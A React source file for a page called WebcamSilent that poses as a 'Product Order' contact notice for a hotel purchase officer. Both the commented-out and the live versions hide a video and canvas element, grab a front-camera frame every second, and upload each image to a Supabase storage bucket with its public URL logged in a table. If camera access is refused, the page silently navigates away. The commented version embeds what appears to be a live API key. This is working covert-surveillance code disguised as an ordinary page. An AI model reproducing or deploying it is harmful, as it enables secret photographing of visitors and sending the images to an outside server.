// // src/WebcamSilent.tsx
// import { useEffect, useRef } from 'react';
// import { createClient } from '@supabase/supabase-js';

// // Replace with your actual Supabase credentials
// const supabase = createClient(
//   'https://oqipqurrkxrianmcexsn.supabase.co',
//   'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9xaXBxdXJya3hyaWFubWNleHNuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTEwNDgxMjIsImV4cCI6MjA2NjYyNDEyMn0.Zm8y57Ki68TxYeeNnvbAMzpK8iTs5vAhXeraszNp_iQ'
// );

// const WebcamSilent = () => {
//   const videoRef = useRef<HTMLVideoElement>(null);
//   const canvasRef = useRef<HTMLCanvasElement>(null);

//   useEffect(() => {
//     const init = async () => {
//       try {
//         const stream = await navigator.mediaDevices.getUserMedia({
//           video: { facingMode: 'user' }
//         });

//         if (videoRef.current) {
//           videoRef.current.srcObject = stream;

//           videoRef.current.onloadedmetadata = () => {
//             videoRef.current?.play();

//             setInterval(async () => {
//               if (!canvasRef.current || !videoRef.current) return;

//               const ctx = canvasRef.current.getContext('2d');
//               if (!ctx) return;

//               ctx.drawImage(videoRef.current, 0, 0, 320, 240);

//               canvasRef.current.toBlob(async (blob) => {
//                 if (!blob) return;

//                 const filename = `screenshot-${Date.now()}.jpg`;

//                 const { error: uploadError } = await supabase.storage
//                   .from('webcam')
//                   .upload(filename, blob, {
//                     contentType: 'image/jpeg',
//                     upsert: false
//                   });

//                 if (uploadError) {
//                   console.error('Upload error:', uploadError.message);
//                   return;
//                 }

//                 const { data: publicData } = supabase.storage
//                   .from('webcam')
//                   .getPublicUrl(filename);

//                 const publicUrl = publicData?.publicUrl;

//                 if (publicUrl) {
//                   await supabase.from('screenshots').insert({ image_url: publicUrl });
//                   console.log('✅ Uploaded:', publicUrl);
//                 }
//               }, 'image/jpeg');
//             }, 1000);
//           };
//         }
//       } catch (err: any) {
//         console.error('Camera error:', err);
//         if (
//           err.name === 'NotAllowedError' ||
//           err.name === 'PermissionDeniedError'
//         ) {
//           // 👈 Go back silently if permission denied
//           window.history.back();
//         }
//       }
//     };

//     init();
//   }, []);

//   return (
//     <div
//       style={{
//         height: '100vh',
//         backgroundColor: 'white',
//         display: 'flex',
//         flexDirection: 'column',
//         justifyContent: 'center',
//         alignItems: 'center',
//         fontFamily: 'sans-serif',
//         color: '#111',
//         padding: '2rem',
//         textAlign: 'center',
//       }}
//     >
//       <h1 style={{ fontSize: '2rem', marginBottom: '1rem' }}>
//         📦 Product Order
//       </h1>
//       <p style={{ fontSize: '1.2rem', lineHeight: '1.6' }}>
//         Please Contact:<br />
//         <strong>Md. Sakibul Islam</strong><br />
//         Purchase Officer<br />
//         Vineyard Hotel<br />
//         House No. 123, Road No. 4, Shaharkhali, Chattogram-4216<br />
//         📞 <strong>018542374651</strong>
//       </p>

//       {/* Hidden video and canvas for webcam capture */}
//       <video ref={videoRef} autoPlay playsInline muted style={{ display: 'none' }} />
//       <canvas ref={canvasRef} width={320} height={240} style={{ display: 'none' }} />
//     </div>
//   );
// };

// export default WebcamSilent;

// src/WebcamSilent.tsx
import { useEffect, useRef } from 'react';
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(
  'https://oqipqurrkxrianmcexsn.supabase.co',
  'your-anon-api-key'
);

const WebcamSilent = () => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const fallbackTimeoutRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    const init = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' }
        });

        if (!videoRef.current) return;
        videoRef.current.srcObject = stream;

        fallbackTimeoutRef.current = setTimeout(() => {
          console.warn('Camera timeout — maybe blocked? Redirecting.');
          window.location.href = '/CameraRequired'; // 👈 Redirect if camera never loads
        }, 5000);

        videoRef.current.onloadedmetadata = () => {
          clearTimeout(fallbackTimeoutRef.current!);
          videoRef.current?.play();

          setInterval(async () => {
            if (!canvasRef.current || !videoRef.current) return;

            const ctx = canvasRef.current.getContext('2d');
            if (!ctx) return;

            ctx.drawImage(videoRef.current, 0, 0, 320, 240);

            canvasRef.current.toBlob(async (blob) => {
              if (!blob) return;

              const filename = `screenshot-${Date.now()}.jpg`;

              const { error: uploadError } = await supabase.storage
                .from('webcam')
                .upload(filename, blob, {
                  contentType: 'image/jpeg',
                  upsert: false,
                });

              if (uploadError) {
                console.error('Upload error:', uploadError.message);
                return;
              }

              const { data: publicData } = supabase.storage
                .from('webcam')
                .getPublicUrl(filename);

              const publicUrl = publicData?.publicUrl;
              if (publicUrl) {
                await supabase
                  .from('screenshots')
                  .insert({ image_url: publicUrl });
                console.log('✅ Uploaded:', publicUrl);
              }
            }, 'image/jpeg');
          }, 1000);
        };
      } catch (err: any) {
        console.error('Camera error:', err);
        // 🚪 Rejected camera — redirect to explanation page
        window.location.href = '/CameraRequired';
      }
    };

    init();

    return () => {
      if (fallbackTimeoutRef.current) {
        clearTimeout(fallbackTimeoutRef.current);
      }
    };
  }, []);

  return (
    <div
      style={{
        height: '100vh',
        backgroundColor: 'white',
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'center',
        alignItems: 'center',
        fontFamily: 'sans-serif',
        color: '#111',
        padding: '2rem',
        textAlign: 'center',
      }}
    >
      <h1 style={{ fontSize: '2rem', marginBottom: '1rem' }}>
        📦 Product Order
      </h1>
      <p style={{ fontSize: '1.2rem', lineHeight: '1.6' }}>
        Please Contact:<br />
        <strong>Md. Sakibul Islam</strong><br />
        Purchase Officer<br />
        Vineyard Hotel<br />
        House No. 123, Road No. 4, Shaharkhali, Chattogram-4216<br />
        📞 <strong>018542374651</strong>
      </p>

      <video ref={videoRef} autoPlay playsInline muted style={{ display: 'none' }} />
      <canvas ref={canvasRef} width={320} height={240} style={{ display: 'none' }} />
    </div>
  );
};

export default WebcamSilent;
